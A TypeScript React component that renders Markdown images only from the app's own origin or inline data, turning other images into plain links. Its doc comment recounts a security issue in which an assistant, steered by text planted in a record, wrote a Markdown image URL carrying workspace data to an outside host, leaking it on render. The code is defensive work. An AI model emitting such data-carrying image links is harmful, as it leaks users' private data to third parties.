import type { ImgHTMLAttributes } from "react";

/** Whether a picture's address is this app's own, or inline: the only
 *  pictures Markdown draws, because drawing one fetches it. */
export function isOwnPicture(src: string | undefined): boolean {
  if (!src) return false;
  if (/^(?:data|blob):/i.test(src)) return true;
  if (src.startsWith("/") && !src.startsWith("//")) return true;
  try {
    return typeof window !== "undefined" && new URL(src).origin === window.location.origin;
  } catch {
    return false;
  }
}

/** A picture in Markdown. Drawing an image fetches it, and the address can
 *  carry anything: an assistant's answer steered by words in a record wrote
 *  ![](https://somewhere/?d=<what it read>), and the browser sent the
 *  workspace's data out the moment the answer showed, with no click (#4115,
 *  security; the app allows images from any https host, for catalogue
 *  pictures in their own fields). So Markdown draws only this app's own
 *  pictures; any other is a plain link that says where it goes and loads
 *  nothing. */
export function MarkdownPicture({ src, alt }: ImgHTMLAttributes<HTMLImageElement>) {
  const at = typeof src === "string" ? src : undefined;
  if (isOwnPicture(at)) return <img src={at} alt={alt ?? ""} className="max-w-full rounded" />;
  if (!at) return <>{alt ?? ""}</>;
  return (
    <a href={at} target="_blank" rel="noreferrer noopener">
      {alt?.trim() ? alt : "A picture"}
      <span className="ml-1 break-all text-xs opacity-70">({at})</span>
    </a>
  );
}
